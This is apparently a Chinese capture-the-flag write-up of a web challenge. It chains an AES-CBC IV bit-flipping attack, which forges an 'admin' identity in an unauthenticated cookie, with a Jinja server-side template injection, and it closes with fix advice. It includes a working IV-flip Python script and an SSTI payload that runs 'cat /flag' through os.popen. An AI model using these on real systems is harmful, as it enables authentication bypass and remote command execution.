# not so web 1

## 题目简述

应用把用户对象序列化为 JSON，再用 AES-CBC 加密后将 `Base64(IV || ciphertext)` 存入 `jwbcookie`。Cookie 只有加密没有消息认证，因此客户端可修改 IV，定向翻转第一块明文中的用户名。伪造 `admin` 身份后，`payload` 参数又被直接拼入 Jinja 模板，形成 SSTI，可读取 flag。

完整链路是 AES-CBC 位翻转绕过身份校验，再利用服务端模板注入执行命令。

## 解题过程

### 获取结构已知的 Cookie

注册并登录一个长度为 5 的用户名，例如 `aaaaa`。服务端使用默认 `json.dumps()` 格式生成：

```json
{"name": "aaaaa", "password_raw": "...", "register_time": 174...}
```

第一块明文的字节偏移可以确定：

```text
{"name": "aaaaa"
0123456789012345
          ^^^^^
          10..14
```

用户名完整落在第一个 16 字节分组中，恰好可以只修改 IV 而不破坏其他密文块。

### 修改 IV 把用户名变为 `admin`

CBC 解密第一块满足：

$$
P_1=D_K(C_1)\oplus IV.
$$

若已知旧明文 $P_1$ 并希望得到 $P'_1$，应构造：

$$
IV'=IV\oplus P_1\oplus P'_1.
$$

因此只需修改 IV 的第 10 至 14 字节：

```python
import base64

raw = bytearray(base64.b64decode(cookie))
old = b"aaaaa"
new = b"admin"

for i, (a, b) in enumerate(zip(old, new), start=10):
    raw[i] ^= a ^ b

forged = base64.b64encode(raw).decode()
```

把 `jwbcookie` 替换为 `forged` 后访问 `/home`。服务端用原密钥解密，得到的 JSON 中 `name` 已变为 `admin`，而 `password_raw`、`register_time` 和 PKCS#7 填充均保持有效。应用只按解密出的名字查询内存用户表，没有任何 MAC 或 AEAD 标签可发现篡改，于是进入管理员分支。

### 利用管理员页面 SSTI

管理员分支先用 Python `%` 运算把 `payload` 放入 HTML，再调用：

```python
return render_template_string(html_template)
```

所以 `payload={{7*7}}` 会在响应中变成 `49`，可确认 Jinja 表达式已执行。该版本没有过滤下划线、引号或属性访问，可通过 Jinja 全局对象进入 Python 模块并读取 flag，例如：

```jinja2
{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}
```

请求时应进行 URL 编码，避免花括号和引号被客户端提前处理：

```python
requests.get(
    target + "/home",
    params={"payload": "{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}"},
    cookies={"jwbcookie": forged},
)
```

若部署中的 flag 路径不同，可先读取应用源码或用有限的目录检查确认位置；不应把临时靶机地址写入利用脚本。

## 方法总结

AES-CBC 只提供保密性，不提供完整性。IV 与首块明文直接异或，客户端可控 IV 加上已知 JSON 前缀就能定向修改身份字段。修复时应使用 AES-GCM、ChaCha20-Poly1305 等 AEAD，或至少对 `IV || ciphertext` 进行先验 MAC 校验；管理员页面还必须把用户输入作为模板数据传入固定模板，不能先拼接再交给 `render_template_string()`。
